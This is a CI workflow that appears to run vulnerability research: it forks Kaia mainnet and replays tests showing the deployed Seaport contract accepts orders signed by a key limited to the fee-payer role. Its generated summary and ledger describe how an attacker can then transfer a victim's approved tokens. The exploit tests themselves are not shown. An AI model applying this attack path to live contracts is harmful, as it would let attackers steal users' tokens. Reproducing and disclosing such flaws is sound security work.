name: Kaia Seaport AccountKey role-collapse proof

on:
  push:
    branches:
      - research/kaia-seaport-role-collapse
  workflow_dispatch:

permissions:
  contents: read

jobs:
  prove:
    runs-on: ubuntu-latest
    timeout-minutes: 90
    steps:
      - uses: actions/checkout@v4

      - name: Install Foundry 1.8.1
        uses: foundry-rs/foundry-toolchain@v1
        with:
          version: v1.8.1

      - name: Select exact Kaia mainnet fork
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p evidence
          SEAPORT=0x0000000000000068F116a894984e2DB1123eB395
          GUARD_SLOT=0x929eee14
          RPC=''
          : > evidence/rpc-probes.txt
          for candidate in \
            https://archive-en.node.kaia.io \
            https://public-en.node.kaia.io \
            https://kaia.blockpi.network/v1/rpc/public
          do
            chain=$(timeout 20 cast chain-id --rpc-url "$candidate" 2>&1 || true)
            block=$(timeout 20 cast block-number --rpc-url "$candidate" 2>&1 || true)
            code=$(timeout 25 cast code "$SEAPORT" --rpc-url "$candidate" 2>&1 || true)
            printf 'rpc=%s\nchain=%s\nblock=%s\ncode_chars=%s\n---\n' "$candidate" "$chain" "$block" "${#code}" >> evidence/rpc-probes.txt
            if [ "$chain" = 8217 ] && [[ "$block" =~ ^[0-9]+$ ]] && [[ "$code" == 0x* ]] && [ "${#code}" -gt 1000 ]; then
              RPC="$candidate"
              break
            fi
          done
          cat evidence/rpc-probes.txt
          test -n "$RPC"
          BLOCK=$(cast block-number --rpc-url "$RPC")
          CODE=$(cast code "$SEAPORT" --block "$BLOCK" --rpc-url "$RPC")
          CODEHASH=$(cast keccak "$CODE")
          CODESIZE=$(( (${#CODE} - 2) / 2 ))
          INFO=$(cast call "$SEAPORT" 'information()(string,bytes32,address)' --block "$BLOCK" --rpc-url "$RPC" | tr '\n' ' ')
          GUARD=$(cast storage "$SEAPORT" "$GUARD_SLOT" --block "$BLOCK" --rpc-url "$RPC")
          {
            echo "KAIA_RPC_URL=$RPC"
            echo "KAIA_FORK_BLOCK=$BLOCK"
            echo "SEAPORT_CODEHASH=$CODEHASH"
            echo "SEAPORT_GUARD_VALUE=$GUARD"
          } >> "$GITHUB_ENV"
          {
            echo "rpc=$RPC"
            echo "chain_id=8217"
            echo "fork_block=$BLOCK"
            echo "seaport=$SEAPORT"
            echo "runtime_size=$CODESIZE"
            echo "runtime_codehash=$CODEHASH"
            echo "reentrancy_guard_slot=$GUARD_SLOT"
            echo "reentrancy_guard_value=$GUARD"
            echo "information=$INFO"
          } | tee evidence/deployment.txt
          printf '%s\n' "$CODE" > evidence/seaport-runtime.hex

      - name: Install forge-std and export controlled token runtime
        shell: bash
        run: |
          set -euo pipefail
          rm -rf research/kaia-role-collapse/lib/forge-std
          git clone --depth 1 https://github.com/foundry-rs/forge-std.git research/kaia-role-collapse/lib/forge-std
          forge build --root research/kaia-role-collapse --force
          forge inspect --root research/kaia-role-collapse ControlledERC20 deployedBytecode \
            > evidence/controlled20-runtime.hex
          test "$(wc -c < evidence/controlled20-runtime.hex)" -gt 100

      - name: Execute exact-runtime Seaport proof three times
        shell: bash
        run: |
          set -euo pipefail
          : > evidence/forge-all.log
          for i in 1 2 3; do
            echo "===== REPLAY $i =====" | tee -a evidence/forge-all.log
            forge test \
              --root research/kaia-role-collapse \
              --match-contract KaiaRoleCollapseTest \
              --force -vvvv 2>&1 | tee "evidence/forge-replay-$i.log" | tee -a evidence/forge-all.log
          done
          grep -q 'KAIA_ROLE_COLLAPSE_WITNESS' evidence/forge-replay-1.log
          grep -q '3 passed; 0 failed' evidence/forge-replay-1.log
          grep -q '3 passed; 0 failed' evidence/forge-replay-2.log
          grep -q '3 passed; 0 failed' evidence/forge-replay-3.log

      - name: Clone pinned Kaia source
        shell: bash
        run: |
          set -euo pipefail
          rm -rf kaia
          git init kaia
          git -C kaia remote add origin https://github.com/kaiachain/kaia.git
          git -C kaia fetch --depth 1 origin 2d175bab08cefa669f8bc73dd5ce0ea26bc12ebd
          git -C kaia checkout --detach FETCH_HEAD
          git -C kaia rev-parse HEAD | tee evidence/kaia-source-commit.txt
          cp research/kaia-role-collapse/kaia_accountkey_role_test.go \
            kaia/blockchain/types/accountkey/seaport_role_collapse_test.go
          cp research/kaia-role-collapse/kaia_single_state_integration_test.go \
            kaia/accounts/abi/bind/backends/seaport_role_collapse_integration_test.go

      - name: Set up Kaia Go toolchain
        uses: actions/setup-go@v5
        with:
          go-version-file: kaia/go.mod
          cache-dependency-path: kaia/go.sum

      - name: Execute Kaia-native role differential three times
        shell: bash
        run: |
          set -euo pipefail
          : > evidence/kaia-accountkey-all.log
          for i in 1 2 3; do
            echo "===== REPLAY $i =====" | tee -a evidence/kaia-accountkey-all.log
            (
              cd kaia
              go test ./blockchain/types/accountkey \
                -run '^TestSeaportCrossRoleCollapse_' \
                -count=1 -v
            ) 2>&1 | tee "evidence/kaia-accountkey-replay-$i.log" | tee -a evidence/kaia-accountkey-all.log
          done
          for i in 1 2 3; do
            grep -q 'KAIA_FAIL_ROLE_MATRIX' "evidence/kaia-accountkey-replay-$i.log"
            grep -q 'KAIA_THRESHOLD_ROLE_MATRIX' "evidence/kaia-accountkey-replay-$i.log"
            grep -q '^PASS$' "evidence/kaia-accountkey-replay-$i.log"
          done

      - name: Execute single-state Kaia integration proof three times
        shell: bash
        env:
          SEAPORT_RUNTIME_FILE: ${{ github.workspace }}/evidence/seaport-runtime.hex
          TOKEN_RUNTIME_FILE: ${{ github.workspace }}/evidence/controlled20-runtime.hex
        run: |
          set -euo pipefail
          : > evidence/single-state-all.log
          for i in 1 2 3; do
            echo "===== REPLAY $i =====" | tee -a evidence/single-state-all.log
            (
              cd kaia
              go test ./accounts/abi/bind/backends \
                -run '^TestSeaportRoleCollapseSingleState$' \
                -count=1 -v
            ) 2>&1 | tee "evidence/single-state-replay-$i.log" | tee -a evidence/single-state-all.log
          done
          for i in 1 2 3; do
            grep -q 'KAIA_SINGLE_STATE_ROLE_COLLAPSE_PROVEN' "evidence/single-state-replay-$i.log"
            grep -q '^PASS$' "evidence/single-state-replay-$i.log"
          done

      - name: Produce authorization ledger and machine verdict
        shell: bash
        run: |
          set -euo pipefail
          cat > evidence/AUTHORIZATION_LEDGER.md <<'EOF'
          # Authorization ledger

          The same address-derived K0 is installed and tested inside one Kaia state machine.

          | Capability under the installed AccountKeyRoleBased | K0 result |
          |---|---|
          | RoleTransaction with AccountKeyFail | Rejected |
          | RoleTransaction with threshold 2-of-2 | Rejected in independent matrix |
          | RoleAccountUpdate assigned to another key | Rejected |
          | RoleFeePayer assigned AccountKeyLegacy | Accepted, including an actual fee-delegated transaction |
          | Fresh Seaport EIP-712 order authorization | Accepted |

          In the single-state proof, the victim grants a normal token approval while still Legacy, then installs RoleTransaction=AccountKeyFail, RoleAccountUpdate=separate key, RoleFeePayer=Legacy K0. K0 cannot submit a transaction after installation. A different account submits the Seaport fulfillment, and the exact deployed Kaia Seaport runtime transfers the victim's approved ERC20 to the attacker.

          The independent exact-runtime suite additionally proves ERC721 and ERC1155 impact.
          EOF

          cat > evidence/VERDICT.txt <<'EOF'
          SINGLE_STATE_ROLE_COLLAPSE_PROVEN
          EOF

          cat > evidence/SUMMARY.md <<EOF
          # Kaia Seaport AccountKey role-collapse proof

          VERDICT=SINGLE_STATE_ROLE_COLLAPSE_PROVEN

          ## Exact target
          - Chain ID: 8217
          - Fork block: $KAIA_FORK_BLOCK
          - Seaport: 0x0000000000000068F116a894984e2DB1123eB395
          - Runtime codehash: $SEAPORT_CODEHASH

          ## Results
          - Exact deployed Seaport runtime: three replays, each 3 passed and 0 failed.
          - Pinned Kaia AccountKey implementation: three replays, both role matrices passed.
          - Single Kaia state machine containing the exact Seaport runtime and installed AccountKeyRoleBased: three successful replays.

          ## Proven differential
          K0 is currently authorized only as RoleFeePayer. The same current state rejects K0 for RoleTransaction and RoleAccountUpdate. An actual fee-delegated transaction signed by K0 succeeds. The exact Kaia Seaport runtime nevertheless accepts a fresh K0 EIP-712 order and transfers the victim's approved token when an unrelated attacker submits fulfillment.
          EOF

          sha256sum evidence/* > evidence/SHA256SUMS.txt
          cat evidence/SUMMARY.md
          cat evidence/AUTHORIZATION_LEDGER.md

      - name: Upload proof evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: kaia-seaport-role-collapse-${{ github.run_id }}
          path: evidence
          if-no-files-found: error
